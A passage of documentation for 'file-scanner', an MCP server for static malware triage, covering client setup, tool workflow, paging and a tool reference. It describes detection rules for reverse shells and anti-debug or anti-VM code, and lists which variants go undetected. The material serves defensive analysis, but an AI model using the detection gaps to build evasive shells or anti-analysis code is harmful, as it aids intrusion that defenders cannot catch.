# MCP Server Guide

`file-scanner` can run as an [MCP](https://modelcontextprotocol.io) server. An AI client such as Claude Code,
Claude Desktop, Cursor or VS Code then calls its tools to look at files on your machine: executables, scripts,
documents, archives, Java archives and npm or Python packages. The scanner reads files and never runs them.

The server has 17 tools. They are built to be used in this order: an overview first, then a targeted question,
then a paged drill-down. Full analysis runs are cached, so the follow-up questions are cheap.

## Contents

- [Quick start](#quick-start)
- [Client setup](#client-setup)
- [How to use the tools](#how-to-use-the-tools)
- [Tool reference](#tool-reference)
- [Worked examples](#worked-examples)
- [Transports and security](#transports-and-security)
- [The cache](#the-cache)
- [Limits](#limits)
- [Troubleshooting](#troubleshooting)

## Quick start

Install the binary (see [INSTALLATION.md](INSTALLATION.md)); `cargo install threatflux-file-scanner --locked`
(crates.io may not list a release yet; if the install fails, build from source or use GitHub Releases)
puts it at `~/.cargo/bin/file-scanner`. Then pick a transport.

### stdio (recommended)

The client starts the server as a child process and talks to it over stdin and stdout. Nothing listens on a port.

```bash
file-scanner mcp-stdio
```

Add `--allow-root <dir>` (repeatable) to limit which directories the tools may read:

```bash
file-scanner mcp-stdio --allow-root ~/samples --allow-root /tmp/incoming
```

### HTTP

```bash
file-scanner mcp-http --port 3000
```

The MCP endpoint is `http://127.0.0.1:3000/mcp` (Streamable HTTP). Use `--port 0` to let the system pick a free
port; the startup banner on stderr prints the one it got.

### Security defaults

| Default | What it means |
| --- | --- |
| Binds `127.0.0.1` | Only this machine can connect. Use `--host 0.0.0.0` to change that. |
| `Host` header check | Only `localhost`, `127.0.0.1`, `::1` and any `--allowed-host` are accepted. |
| `Origin` header check | A browser `Origin` must be a loopback origin or an `--allowed-origin`, else 403. |
| No CORS wildcard | Preflights are answered for allowed origins only. |
| No token | Anyone who can reach the port can call the tools. Set `--auth-token` before you expose it. |
| No path limit | Tools can read any file the server's user can read. Set `--allow-root` to confine them. |

The tools return file contents (strings, hex dumps), so an exposed server is a file-reading service. If you
publish the port, always set `--auth-token` and `--allow-root`, and put a TLS-terminating proxy in front. The
server itself speaks plain HTTP. Details are in [Transports and security](#transports-and-security).

## Client setup

Use the absolute path of the binary in every client config. GUI clients often start with a different `PATH` than
your shell, so a bare `file-scanner` may not be found. Find the path with `command -v file-scanner`.
`cargo install` puts the binary at `~/.cargo/bin/file-scanner`; replace `~` with your home directory in JSON files,
which do not expand it.

### Claude Code

Add a stdio server:

```bash
claude mcp add file-scanner -- /absolute/path/to/file-scanner mcp-stdio
```

Everything after `--` is the command line. By default the server is stored for you in the current project (scope
`local`). Use `--scope user` to make it available in all your projects, or `--scope project` to write a
`.mcp.json` at the project root that you can commit:

```bash
claude mcp add --scope user file-scanner -- /absolute/path/to/file-scanner mcp-stdio
claude mcp add --scope project file-scanner -- /absolute/path/to/file-scanner mcp-stdio \
  --allow-root /absolute/path/to/samples
```

The `.mcp.json` form of the same entry:

```json
{
  "mcpServers": {
    "file-scanner": {
      "command": "/absolute/path/to/file-scanner",
      "args": ["mcp-stdio", "--allow-root", "/absolute/path/to/samples"]
    }
  }
}
```

To connect to a running HTTP server instead:

```bash
claude mcp add --transport http file-scanner http://127.0.0.1:3000/mcp
```

If the server has a token, pass it as a header:

```bash
claude mcp add --transport http file-scanner http://127.0.0.1:3000/mcp \
  --header "Authorization: Bearer $FILE_SCANNER_AUTH_TOKEN"
```

Check the result with `claude mcp list`, or run `/mcp` inside Claude Code.

### Claude Desktop

Claude Desktop reads `claude_desktop_config.json`:

| OS | Location |
| --- | --- |
| macOS | `~/Library/Application Support/Claude/claude_desktop_config.json` |
| Windows | `%APPDATA%\Claude\claude_desktop_config.json` |
| Linux | `~/.config/Claude/claude_desktop_config.json` |

Add the server under `mcpServers`, then quit and reopen Claude Desktop:

```json
{
  "mcpServers": {
    "file-scanner": {
      "command": "/absolute/path/to/file-scanner",
      "args": ["mcp-stdio"]
    }
  }
}
```

On Windows write the path with escaped backslashes or forward slashes, for example
`"C:/Users/you/.cargo/bin/file-scanner.exe"`.

### Cursor

Cursor reads `.cursor/mcp.json` in a project, or `~/.cursor/mcp.json` for all projects. The top-level key is
`mcpServers`:

```json
{
  "mcpServers": {
    "file-scanner": {
      "command": "/absolute/path/to/file-scanner",
      "args": ["mcp-stdio"]
    }
  }
}
```

### VS Code

VS Code reads `.vscode/mcp.json` in a workspace. The top-level key here is `servers`, not `mcpServers`:

```json
{
  "servers": {
    "file-scanner": {
      "type": "stdio",
      "command": "/absolute/path/to/file-scanner",
      "args": ["mcp-stdio"]
    }
  }
}
```

### Docker

Tool calls resolve paths on the server's own file system. A container only sees what you mount, so mount the files
at the same path inside the container as on the host. Then the paths a client sends are valid in both places.

```bash
claude mcp add file-scanner -- docker run -i --rm \
  -v "$PWD:$PWD:ro" -w "$PWD" ghcr.io/threatflux/file-scanner:latest mcp-stdio
```

The JSON equivalent for other clients:

```json
{
  "mcpServers": {
    "file-scanner": {
      "command": "docker",
      "args": ["run", "-i", "--rm", "-v", "/absolute/samples:/absolute/samples:ro",
               "-w", "/absolute/samples",
               "ghcr.io/threatflux/file-scanner:latest", "mcp-stdio"]
    }
  }
}
```

Notes:

- Use `-i` (keep stdin open) and no `-t`. The client speaks JSON-RPC over stdin and stdout.
- Only mounted paths can be scanned. The image runs as user 65532, so mounted files must be readable by it.
- Inside the container the cache goes to the container user's cache directory, `$HOME/.cache/file-scanner`. If that
  is not writable, the server says so on stderr and caches in memory only. Pass `--cache-dir` (for example a tmpfs or
  a volume) to keep an on-disk cache, or `--no-cache` to turn caching off.
- These Docker recipes were not run for this change: no image with these flags exists until the next release. Check
  them against the image you use.
- The image's entry point is the scanner itself, so always give the subcommand (`mcp-stdio` or `mcp-http`).
- For HTTP in a container the server must listen on all container interfaces, and the published port should stay
  on the host's loopback unless you add a token:

  ```bash
  docker run --rm -p 127.0.0.1:3000:3000 -v "$PWD:/data:ro" ghcr.io/threatflux/file-scanner:latest \
    mcp-http --host 0.0.0.0 --port 3000 --allow-root /data --auth-token "$TOKEN"
  ```

  Clients then send `/data/...` paths, and must send the token as `Authorization: Bearer <token>`.

## How to use the tools

### The workflow

1. **Overview.** Call `analyze_file` with only `file_path`. You get type, hashes, headline facts, the most telling
   strings and a `next_steps` list that names the next call. It never runs the heavy analyses. For a directory it
   returns one triage row per file. Every `next_steps` entry, in every tool that has the list, is an object
   `{tool, arguments, gives}`: send `tool` and `arguments` as written; `gives` says what the call returns. There is
   no other key for the explanation and no plain-string step. Steps in section answers and in `all: true` also carry
   `other_lists` when the section has more than one list, and the `disassembly` step (of `sections: ["disassembly"]`
   and of `all: true`) carries a nested `then` step. The tools that return `next_steps` are `analyze_file`,
   `disassemble`, `compare_files`, `search_strings`, `cache_status`, `analyze_document` and `analyze_script` (inside
   `summary`), `inspect_archive`, `analyze_java_file` and the two package tools. `query_analysis`, `read_hex`,
   `string_details`, `llm_analyze_file`, `yara_scan_file` and `cache_clear` have none. Advice that is not a call is
   not a step: `cache_status` and `search_strings` put it in `hint`, and `inspect_archive` puts it in
   `summary.notes`. The overview offers a specialist step only when the call would work as written. For a script
   it names `analyze_script` only for Shell, PowerShell, JavaScript, Python, Batch and VBScript, decided from the
   `#!` line first and then the extension: a Perl, Ruby, PHP, Lua or AWK script gets no such step, and neither does
   a `.sh` file whose shebang names Perl (a call by hand still rates that one as shell). For a zip it leaves out
   `inspect_archive` when `format_details.archive.error` is present (the central directory could not be read). The
   overview of a `.tar.gz` and that of a `.tgz` offer both package steps, `analyze_npm_package` and
   `analyze_python_package`, by the file name and without looking inside: their `gives` says the call is an error
   when the archive is not that kind of package.
2. **One section.** Ask for a named section: `analyze_file` with `sections: ["symbols", "vulnerabilities"]`. Each
   section is computed in full, cached by the file's SHA-256 and returned as a short summary.
3. **Read the items.** `query_analysis` pages and filters the lists inside a section (strings, imports,
   functions, findings). Then use `disassemble` for one function's machine code and `read_hex` for raw bytes.
4. **Compare and search.** `compare_files` for two files; `search_strings` and `string_details` to hunt a string
   across files.
5. **Specialist tools** by file kind: `analyze_document` (PDF, Office), `analyze_script`, `inspect_archive`,
   `analyze_java_file`, `analyze_npm_package`, `analyze_python_package`. The overview names the right one.
6. **Detection.** `llm_analyze_file` gives a compact digest and a draft YARA rule. `yara_scan_file` tests a rule.
7. **Housekeeping.** `cache_status` shows what is cached. `cache_clear` forgets it.

### `all: true`

`analyze_file` with `all: true` runs every analysis once, stores each full section in the cache, and returns only
per-section summaries. The later `query_analysis` calls on that file, and `disassemble` calls inside the stored
window, are answered from the cache. `read_hex` reads the file directly and has no cache. A `disassemble` call for a
function outside the stored window is decoded again each time (the answer carries a `window_note`; about a second
on a large binary). `all: true` still costs analysis time on a large binary, so use it when you plan to ask several
follow-up questions. For a quick look, the overview is enough.

### Output size and the byte budget

Clients limit how much tool output they will inline: Claude Code warns above 10,000 tokens and caps MCP output at
25,000 tokens by default. The server therefore bounds every answer.

- Every tool takes `max_output_bytes` (default 80,000, minimum 4,000, ceiling 400,000). The answer never exceeds it.
  A value above or below that range is clamped to it; a negative value is an error.
- Anything that did not fit is named in the answer: a cut page carries a `hint` and `next_offset` (a cut
  `disassemble` listing carries a `note` and `next_address`); `analyze_file` section summaries (`sections` or
  `all: true`) that were reduced to counts say so in `note`; `compare_files` and `llm_analyze_file` list what was
  cut under `truncated`.
- A `next_steps` entry is never shortened. At a small `max_output_bytes` the list is cut by whole steps: a step is
  returned with its exact arguments or dropped. In the overview the drop is listed in `truncated.cut` with the path
  `/next_steps` (`kept` is the number of steps left). An `analyze_file` answer whose section summaries were reduced to
  counts (it says so in `note`, for example `all: true` at 4,000 bytes) drops steps without a `/next_steps` entry. The
  top-level `file_path`, `package_path` or `path` echo is shortened only as a last resort, when nothing else is left to
  cut; that cut is listed in `truncated.cut` too. Over a 4,000-byte budget, the overview of
  `test_programs/c_advanced_binary` at a 470-character path keeps the path whole and loses its steps
  (`{"path": "/next_steps", "kind": "array", "original": 5, "kept": 0}`, and it also keeps only 7 of its 8
  `interesting_strings`, 6 under `--no-cache`), while `all: true` at a 909-character path on a
  server started with `--no-cache` cuts the path to `"...[cut 909 of 909 bytes]"`
  (`{"path": "/file_path", "kind": "string", "original": 909, "kept": 0}`); with the cache on, the start of the path is
  kept, and how many bytes depends on the rest of the answer (60 to 64 in our runs).
- Lists come back in pages (see below), so a large list is never sent whole.

Real sizes, in characters of the default answer (test programs from this repository, section cache on):

| Call | 22 KB ELF | 3.8 MB ELF | 8.3 MB ELF |
| --- | --- | --- | --- |
| `analyze_file` (overview) | 3,135 | 4,280 | 3,828 |
| `analyze_file` with `all: true` | 26,473 | 32,036 | 34,614 |
| `llm_analyze_file` | 2,627 | 5,257 | 4,570 |

`hex_dump` and `strings` through `analyze_file` return summaries and short samples. To read the actual lists use
`query_analysis`; to read bytes use `read_hex`.

### Paging

The paged tools use the same four ideas (a total, a count returned, the offset, and where to continue), but the
field names depend on the tool:

- `query_analysis`, `search_strings`, `string_details`, `cache_status` and the `disassemble` function list return
  `total`, `returned`, `offset` and `next_offset` at the top level. `next_offset` is absent on the last page.
  `analyze_file` on a directory does the same for its `files` table.
- `analyze_document`, `analyze_script`, `inspect_archive` and `analyze_java_file` nest the four fields under the
  list's name (`findings`, `entries`, `classes`, `resources` and so on). The first three put the summary beside the
  page; the paged views of `analyze_java_file` carry no summary (it is the `summary` view).
- `yara_scan_file` pages matching files and calls the fields `matches_total`, `matches_returned`, `matches_offset`
  and `next_offset`.
- A `disassemble` listing pages instructions, not rows: `returned`, `more`, `remaining` and `next_address`. Pass
  `next_address` as `address` to continue.

Capped lists inside a summary (for example `nested_archives` or `manifest.class_path` in `analyze_java_file`) are
`{items, total, truncated}` or a bare array; they are not paged.

If the byte budget cuts a page, `returned` and `next_offset` describe the rows actually sent, so following
`next_offset` loses nothing:

```json
{
  "items": [ ... 47 rows ... ],
  "total": 54687,
  "returned": 47,
  "offset": 0,
  "next_offset": 47,
  "hint": "The page was cut to 47 of the 500 rows asked for to fit max_output_bytes; repeat the call with offset 47 ...",
  "cache": "hit"
}
```

### `cache: hit | miss`

Most answers say where they came from. `hit` means a stored result was used; `miss` means the analysis ran now and
was stored. `partial` means some of the requested sections were stored and some were computed, or, for
`disassemble`, that code outside the stored window was decoded again.
Under `--no-cache` nothing is stored and every call recomputes. Answers still carry `cache: "miss"`
(`search_strings` with `file_path`: `miss_not_cached`); `analyze_file`, `query_analysis` and `disassemble` add a
`cache_note` that says the section cache is off, the other tools do not. `cache_status` reports `enabled: false`.

### Errors

A tool that cannot do what was asked returns a normal result with `isError: true` and a message that says what to
fix. It is not a protocol error, so the client can show it to the model and the model can retry:

```json
{ "content": [ { "type": "text", "text": "File does not exist: /nonexistent/file" } ], "isError": true }
```

Examples of messages: a path outside `--allow-root` names the allowed directories; an offset past the end of a file
gives the file size; a YARA rule that does not compile carries the compiler's message, line and column; a registry
name given to a package tool says the tool is offline and how to get the package locally; an unknown argument lists
the valid ones. Calling a tool that does not exist is a JSON-RPC `-32602` error.

### Paths

Absolute paths are recommended. A relative path is accepted and resolved against the server's working directory, which
for a client-launched server is often not the directory you expect, so the same call can read a different file (or none)
from one launch to the next. A leading `~/` is expanded. Symbolic links are resolved. FIFOs, sockets and device files
are refused as a path. Inside a directory, such an entry is skipped and listed as skipped; it is never opened. In
the `analyze_file` triage table, symbolic links are never followed or listed: they are counted under `links_skipped`,
also under `--allow-root`. In a `yara_scan_file` directory scan, a link is listed under `skipped`, except that under
`--allow-root` a link that points outside the roots refuses the call. With `--allow-root`, every path you name must
resolve (symlinks and `..` included) to a place under one of the roots. The tools that report what earlier calls
stored (`cache_status`, `search_strings` without `file_path`, `string_details`) also show only files inside a root;
see [The cache](#the-cache).

### Testing by hand

stdio messages are one JSON object per line. Do not pretty-print a request; each line is parsed on its own. This
one-line session lists the tools:

```bash
INIT='{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18",'
INIT+='"capabilities":{},"clientInfo":{"name":"test","version":"1"}}}'
printf '%s\n' "$INIT" \
  '{"jsonrpc":"2.0","method":"notifications/initialized"}' \
  '{"jsonrpc":"2.0","id":2,"method":"tools/list"}' \
  | file-scanner mcp-stdio 2>/dev/null | jq -c '{id, tools: (.result.tools // [] | length)}'
```

```text
{"id":1,"tools":0}
{"id":2,"tools":17}
```

The `initialize` reply carries the server's instructions; the second reply lists all 17 tools. The server writes
only JSON-RPC to stdout; the banner goes to stderr.

## Tool reference

Arguments marked `*` are required. Every tool also accepts `max_output_bytes` (default 80,000; a value outside
4,000 to 400,000 is clamped to that range, and a negative value is an error, even though the schema declares the
range as minimum and maximum).
Paged tools accept `offset` (default 0) and `limit` (default 50, at most 500 unless stated). Unknown arguments are
rejected. All tools are read-only except `cache_clear`. Examples are shortened and use `/samples/...` for paths.

### analyze_file

Start here. Triage overview of a file or directory.

| Argument | Notes |
| --- | --- |
| `file_path`* | Absolute path of a file, or of a directory (triage table). |
| `sections` | Names to run (listed below the table). |
| `all` | Run every section; return summaries only. |
| Boolean flags | The same section names as flags (`symbols: true`) are accepted too. |
| `min_string_length` | Shortest string to count (default 4, at most 4,096). |
| `hex_dump`, `hex_dump_size`, `hex_dump_offset` | Default 256 bytes, at most 4,096; negative offset: from end. |
| `arch` | Universal Mach-O slice, as the overview's `type` names it (`x86_64`, `arm64e`). Unknown: error. |
| `recursive`, `max_files` | Directory only: descend; most files listed (default 1,000, ceiling 10,000). |
| `offset`, `limit` | Directory only: page of the triage table (limit at most 200). |

Section names: `metadata`, `hashes`, `strings`, `hex_dump`, `binary_info`, `signatures`, `symbols`, `control_flow`,
`vulnerabilities`, `code_quality`, `dependencies`, `entropy`, `disassembly`, `call_graph`, `threats`,
`enhanced_threats`, `behavioral`, `taint`, `yara_indicators`.

With no section named, the answer is the overview:

```json
{
  "view": "overview",
  "file_path": "/samples/test_programs/c_advanced_binary",
  "size": 22088,
  "sha256": "91f09b18aceb91cbcdbf35e98b9ffb21bd91746abdcb00d95c17abd901cad3f0",
  "type": "ELF 64-bit shared object or PIE executable (x86-64)",
  "kind": "elf",
  "format": { "format": "ELF", "architecture": "x86_64", "compiler": "GCC/GNU", "is_stripped": false, ... },
  "signature": { "is_signed": false, "verification_status": "No signature found" },
  "entropy": { "overall": 3.37, "likely_packed": false, "likely_encrypted": false, ... },
  "interesting_strings": [
    { "category": "IP Address", "value": "127.0.0.1", "offset": 12327 },
    { "category": "File Path", "value": "/proc/self/status", "offset": 12298 },
    { "category": "Environment Variable", "value": "__FRAME_END__", "offset": 18684 },
    { "category": "Debug Info", "value": "ptrace", "offset": 2046 }, ...
  ],
  "counts": { "strings": 189, "unique_strings": 185, "functions": 57, "imported_symbols": 38, "exported_symbols": 18 },
  "available_sections": ["metadata", "hashes", "strings", ...],
  "not_applicable": { "taint": "applies to UTF-8 source or script text only, not to this kind of file" },
  "next_steps": [
    { "tool": "analyze_file",
      "arguments": { "file_path": "...", "sections": ["symbols", "threats"] },
      "gives": "a summary of each named section (...); swap in any of available_sections; ..." },
    { "tool": "query_analysis",
      "arguments": { "file_path": "...", "section": "strings", "category": "IP Address" },
      "gives": "page and filter every string (filter, category, encoding, offset, limit)" }, ...
  ],
  "cache": "miss"
}
```

The overview adapts to the file. The first step names `["symbols", "threats"]` for a native binary and `["threats",
"behavioral"]` for other files, including every Java and zip-based archive. `counts.imported_symbols` equals
`format.imports_count`, and the imports step (`query_analysis`, section `binary_info`, list `imports`) is left out when
there are none. A Java class file lists the native sections under `not_applicable`, gets no `disassemble` or imports
step and has no `counts.functions`, `counts.imported_symbols` or `counts.exported_symbols` (only the string counts). A
zip is never offered the native `symbols` and `threats` pair or a `disassemble` step (`disassemble` on one is an error).
A `.jar`, `.war`, `.ear` or `.aar`, and a zip whose entries mark it as a Java archive (for example `WEB-INF/`), is
reported as kind `jar` with the Java label (`Java web application archive (WAR)`) and gets an `analyze_java_file` step
beside `inspect_archive`; a zip that only has `META-INF/application.xml` and is not named `.ear` stays a plain zip. The
overview of a Java archive (`.jar`, `.war`, `.ear`, `.aar`, `.apk`) has no `notes` entry for `symbols`: the sections
that do not apply are under `not_applicable`. A gzip stream that is not a tar gets no `inspect_archive` step. For a
universal Mach-O, `type` lists the slices (`Mach-O universal binary (3 slices: x86_64, arm64e, arm64-subtype-12)`),
`format.analyzed_slice` names the one that was read (the host's, else the first), and when that slice is not x86,
`control_flow`, `vulnerabilities` and `code_quality` are listed under `not_applicable` with a reason that names
`disassemble` and, if the file has an x86 slice, `arch: "x86_64"`. `arch` accepts a slice name as the overview prints it
(`x86_64`, `arm64e`, `arm64-subtype-12`), and also the older spellings `ARM64E` and `ARM64 (subtype 12)`, which the
`binary_info` summary still prints under `universal_slices` (a count and a sample, not a pageable list). `arm64` and
`aarch64` pick the slice named `arm64` when the file has one, else the only ARM64-family slice; when several slices are
ARM64-family and none is named `arm64`, the error lists the slice names. Directory triage rows name the slices the same
way as the overview. The `next_steps` of `disassemble` repeat the `arch` you passed; those of section answers spell the
slice as the overview does (`"arch": "arm64-subtype-12"`, never `arm64 (subtype 12)`).

With sections or `all: true`, each section comes back as a summary (counts, headline numbers, a few top items) at the
top level, plus `errors` (sections that failed), `notes` (sections that do not apply, with the reason), `next_steps`
and `cache`. `all: true` on that file is 26,473 characters. For a directory the answer is `view: "directory"` with a
paged `files` table (path, size, type, kind, sha256, entropy, `flags`), `total`, `next_offset`, and
`not_entered` when subdirectories were skipped. Symbolic links are never followed or listed (`links_skipped` counts
them), and a FIFO, socket or device is listed under `skipped`. The first `next_steps` entry names the first file of
the page.

Limits: a file over 256 MiB gets an overview without the whole-file sections (the answer says what was skipped and
the call that runs it). A directory walk stops after 200,000 entries or 10 seconds. The overview names the specialist
tool for the file's kind (`analyze_document`, `analyze_script`, `inspect_archive`, `analyze_java_file`,
`analyze_npm_package`, `analyze_python_package`).

### query_analysis

Page and filter the lists inside one section of a file. Runs the section if it is not cached.

| Argument | Notes |
| --- | --- |
| `file_path`*, `section`* | One of the sections above except `hashes`, `metadata`, `hex_dump`, `signatures`. |
| `list` | List inside the section; default is its main list. The answer names `available_lists`. |
| `filter` | Case-insensitive substring; with `regex: true`, a regular expression. On `threats` and `enhanced_threats` rows it also searches the metadata values. |
| `category` | Strings: `URL`, `IP Address`, ... Vulnerabilities: category or severity. Threats: `metadata.category`. |
| `encoding` | Strings only: `ascii`, `utf16le` or `utf16be`. |
| `min_string_length` | Strings only (default 4, at most 4,096). |
| `detail` | Return raw rows instead of compact ones. |
| `arch` | Universal Mach-O slice, as for `analyze_file`. Unknown: error. |

Lists by section: `strings`; `binary_info` (sections, imports, exports); `symbols` (functions, imports, exports,
global_variables, cross_references); `control_flow` (functions); `vulnerabilities`; `code_quality` (functions,
quality_issues); `dependencies` (dependencies, compliance_issues); `entropy` (sections, high_entropy_regions);
`disassembly` (functions, instructions, suspicious_patterns); `call_graph` (functions, edges,
unreachable_functions); `taint` (flows, vulnerabilities, sources, sinks, sanitizers); `threats` and
`enhanced_threats` (matches, indicators); `behavioral` (findings, plus each group); `yara_indicators`.

```json
{
  "items": [ { "offset": 12327, "encoding": "ascii", "value": "127.0.0.1", "category": "IP Address" } ],
  "total": 1, "returned": 1, "offset": 0,
  "section": "strings", "list": "strings", "unfiltered_total": 189,
  "applied": { "category": "IP Address" },
  "available_lists": ["strings"],
  "cache": "hit"
}
```

`unfiltered_total` is the size of the stored list before the filter. For a file with more strings than the
stored list holds, an unfiltered page says so (`strings_in_file` and a `note`; `unfiltered_total` is then the size of
the stored list). A `filter`, `category` or `encoding` scans the whole file again for the matches, and
`unfiltered_total` and `strings_in_file` then equal the file's string count. A `category` that no row has gives
`total: 0` and a `note` that lists the categories of the file with their counts (`Categories in this file: ...`); for
`threats` it lists the values of `metadata.category`. Pages of `control_flow`, `call_graph`, `code_quality` and
`disassembly` repeat the section's limit notes, with the kept and real counts, in `note`.

A `threats` or `enhanced_threats` match row whose evidence is thin carries `evidence_strength: "weak"` and an
`evidence_reason` in its `metadata`. A weak match is listed but adds no classification and does not raise the
threat level. Because `filter` also searches the metadata values, `filter: "weak"` returns only those rows. Reasons
seen from the built-in rules include `only hypervisor product names matched` (the `anti_analysis` rule with fewer
than two debugger API names, no tracer test and no `/dmi/id/` string), `two short byte patterns found far apart in a
large file` (the `shellcode_patterns` get-pc and SEH pair in a file over 256 KiB), `every matched string is under 4
bytes or a run of one repeated byte` (also a padding run beside a lone get-pc string) and `a text file that
describes the technique in words` (an anti-debug or anti-VM match in a text file that does not call the technique, see
below, or a `backdoor_patterns` match in a text file on the words `bind shell` or `reverse shell`, also when part of
the Python reverse-shell set is present). A match without these keys is full evidence:

```json
{ "rule_identifier": "anti_analysis", "tags_count": 2,
  "metadata": { "category": "evasion", "evidence_strength": "weak",
                "evidence_reason": "only hypervisor product names matched",
                "description": "Detects anti-analysis and anti-VM techniques" } }
```

Two built-in rules are narrower than their names: `persistence_mechanisms` does not match the word `schtasks` alone (it
needs the command that creates a task, or the word anywhere in a file that also names the Windows Run registry key),
and `backdoor_patterns` flags a Python reverse shell only when the file holds all four strings the rule looks for: a
socket constructor, a connect call, a dup2 call and either the path of `sh` or a pty spawn. One dup2 call onto any
descriptor is enough; the rule does not check that the three standard descriptors are redirected. A file that holds
the full set, such as a tutorial with complete code, is still rated Suspicious with the `Backdoor` classification; a
text file that holds only some of the four does not match the rule, and a text file that only says `reverse shell` or
`bind shell` is listed as weak.

A text source file that calls an anti-debug or anti-VM technique keeps the `anti_analysis` rule's normal level
(Suspicious) instead of being called a text file that describes the technique in words. The rule itself must still match
on more than hypervisor names alone: two debugger API names, `TracerPid` with `/proc/self/status` (and `ptrace`, a
`/dmi/id/` string or one of the calls below), or two hypervisor names beside a `/dmi/id/` string. A file that holds two
hypervisor names and calls `ptrace(PTRACE_TRACEME, ...)` or `IsDebuggerPresent()`, with no second debugger API, no
`TracerPid` and no `/dmi/id/` string, stays weak (`only hypervisor product names matched`, Clean). The forms that
count as a call are `IsDebuggerPresent(` or `CheckRemoteDebuggerPresent(` called; `ptrace(` with `PTRACE_TRACEME` or
`0`; an open, read, exists or inquire call on `"/proc/self/status"`; `sysctl` followed within 300 bytes by `P_TRACED`
(not seen when the first `sysctl` within those 300 bytes does not count itself, such as the one in
`#include <sys/sysctl.h>`, whose line has no `;`, `{` or `=`); and, only in some spellings, a file-read call in a file
that holds a double-quoted string with `/dmi/id/` (see the known limits below).
Seven sources in `test_programs` rate Suspicious this way (`ada_test.adb`, `c_advanced.c`, `d_test.d`,
`fortran_test.f90`, `go_test.go`, `nim_test.nim` and `zig_test.zig`); the rule does not match `cpp_test.cpp`, which
calls `IsDebuggerPresent()` and `ptrace(PTRACE_TRACEME, ...)` but has no second debugger API name, no `TracerPid` and
no hypervisor names. These do not count as a call, and the match stays weak evidence (Clean): a name inside a
double-quoted string, a backtick span, a `//` line comment or a `/*` comment that is not yet closed; anything in a file
with a Markdown fence line; a file with no declaration or include line (`fn`, `def`, `func`, `class`, `import`, `use`,
`package`, `let`, `const`, `#include`, `#define` and similar); and a debugger-API, `ptrace`, `sysctl` or
`/proc/self/status` match whose line has no `;`, `{` or `=` (the DMI file read needs none). A real call after a closed
`/* ... */` comment, such as a header comment above `main`, counts.
When the call is a read of `/proc/self/status`, `TracerPid` and that read in source code meet the tracer test, so the
file is no longer dismissed with `only hypervisor product names matched`.

Known limits of these rules:

- Ordinary code that calls a debugger-check API is rated Suspicious. A source file that calls `IsDebuggerPresent()`
  and also uses `OutputDebugString`, such as a Windows logging helper that writes to the debugger output window when
  one is attached, rates Suspicious, as its compiled form does. The scanner cannot tell a debug-aware logger from
  anti-debug code, because both call the same API.
- Hardware-inventory or virtualization-detection code can be rated Suspicious, and whether it is depends on other
  string literals in the file. Source that reads a DMI product file (under `/sys/class/dmi/id/` or
  `/sys/devices/virtual/dmi/id/`) and names two hypervisors rated Suspicious when the file also held two adjacent
  quoted items (`"VirtualBox", "VMware"`, an unrelated `["a", "b"]`, or `fopen("...", "r")` in C) or, in Go, an
  `import ( ... )` block of two or more packages. The same Go read with `== "VirtualBox"` and `== "VMware"`
  comparisons rated Clean (weak) after a one-line `import "os"`, and so did Python that tested `"VMware" in name` with
  no such list. A host-report tool and anti-VM code get the same rating.
- A long block comment or a `#` comment can be taken for a call. A `/* */` comment that opens more than 4,096 bytes
  before the API name is not recognised as a comment, and neither is a `#` comment (Python, shell) whose line contains
  `;`, `{` or `=`. A benign file that names `IsDebuggerPresent();` and `CheckRemoteDebuggerPresent();` in such a
  comment rates Suspicious.
- Some real anti-debug code still rates Clean. Only debugger-API, `ptrace`, `sysctl` and `/proc/self/status` calls that
  share a line with `;`, `{` or `=` count as statements, so a Python `with open("/proc/self/status") as f:` read does
  not count, and neither does code whose only checks are VM names or `OutputDebugString`. Such code keeps the weak
  `describes the technique in words` rating.
- A bash script that opens a read-write network descriptor and then loops over commands read from it, or starts a
  shell on it, is not detected and rates Clean. The classic redirect of a shell's standard streams to a network path
  and the Python socket, `dup2` and pty reverse shell are detected.
- Text that quotes threat strings is still rated as the threat. Documents and sources that quote ransom-note phrases,
  reverse-shell command lines or miner pool strings as examples rate the same as the real thing:
  `THREATFLUX_THREAT_DETECTION_LIBRARY_DESIGN.md` and `src/mcp_server/tools_yara.rs` rate Critical (Ransomware).

The threats and enhanced_threats sections are stored with a revision in their cache key (revision 3): results that an
earlier build stored are recomputed, not served.

### disassemble

Machine code of one function or address range, as a text listing. Never the whole binary.
`disassemble` works on an ELF, a PE, a thin Mach-O, or one slice of a universal Mach-O.

| Argument | Notes |
| --- | --- |
| `file_path`* | Absolute path. |
| `function` | A function-list or symbol-table name (exact, else a unique case-insensitive substring), or an address (`"0x1d49"`, or a decimal string when no function name contains that text). |
| `address` | `"0x401136"` or a number: the function containing it is listed from there. |
| `arch` | Universal Mach-O slice, as for `analyze_file`. Unknown: error. |
| `max_instructions` | Default 200, at most 1,000. |
| `filter`, `offset`, `limit` | With neither `function` nor `address`: page through the function list. |

With neither `function` nor `address` it lists functions:

```json
{
  "view": "functions",
  "items": [
    { "name": "_start", "address": "0x1460", "size": 38, "instructions": 13, "complexity": 2 },
    { "name": "deregister_tm_clones", "address": "0x1490", "size": 48, "instructions": 11, "complexity": 3 }, ...
  ],
  "total": 20, "returned": 3, "offset": 0, "next_offset": 3,
  "architecture": "x86_64", "total_instructions": 773, "decoded_range": "0x1460..0x20c9",
  "next_steps": [ { "tool": "disassemble", "arguments": { "file_path": "...", "function": "_start" },
                    "gives": "the instruction listing of the first function of this page (for another row pass its `address`, ...)" } ],
  "cache": "hit"
}
```

The first `next_steps` entry names the first function on the page, by `function`. When several functions share that
name (a Rust or Go binary can have them), the step passes the row's `address` instead, because a name that several
rows share is an error: the message lists the matches with their addresses. Pass the `address` of any row. A file with
more than 5,000 function symbols lists the first 5,000 and says so in `note`; `filter` also searches the others (their
rows carry `listed_from` and no `instructions` or `complexity`), and the note gives the kept and real counts.

With `function: "main", max_instructions: 5`:

```json
{
  "view": "listing",
  "function": { "name": "main", "address": "0x1d49", "size": 897, "complexity": 16, "instructions": 210 },
  "listing": "0x1d49  f3 0f 1e fa              endbr64\n0x1d4d  55                       push rbp\n ...",
  "returned": 5, "more": true, "remaining": 205, "next_address": "0x1d58", "cache": "hit"
}
```

Limits: `disassemble` works on an ELF, a PE, a thin Mach-O, or one slice of a universal Mach-O (the tool description in
`tools/list` says `ELF, Mach-O or PE (x86, x86-64, ARM64)`). Pick the slice with `arch`. A PE is decoded as x86, x86-64
or ARM64 by its COFF machine (`0x14c`, `0x8664`, `0xaa64`); an ARM64 PE reports `architecture: "ARM64"` and lists 4-byte
ARM64 instructions, and so do the `disassembly` section of `analyze_file` and the opcodes of `llm_analyze_file`. Any
